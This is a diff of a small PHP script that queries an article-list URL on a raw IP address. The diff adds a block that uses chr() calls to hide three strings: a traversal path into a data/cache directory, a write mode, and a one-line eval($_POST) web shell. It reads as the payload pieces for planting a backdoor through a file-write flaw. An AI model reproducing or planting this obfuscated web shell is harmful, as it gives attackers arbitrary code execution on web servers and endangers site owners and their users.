@@ -1,4 +1,30 @@
 <?php
+echo chr(46).
+    chr(46).
+    chr(47).
+    chr(100).
+    chr(97).
+    chr(116).
+    chr(97).
+    chr(47).
+    chr(99).
+    chr(97).
+    chr(99).
+    chr(104).
+    chr(101).
+    chr(47).
+    chr(116).
+    chr(46).
+    chr(112).
+    chr(104).
+    chr(112);
+echo "\n";
+echo     chr(119).
+    chr(43);
+echo "\n";
+echo chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(116).chr(39).chr(93).chr(41).chr(59).chr(63).chr(62);
+
+exit;
 $url = 'http://118.89.26.188:8081/Home/Article/list?id=1&p=1';
 echo $url='?s=view&p=5'."\n";
 echo '';
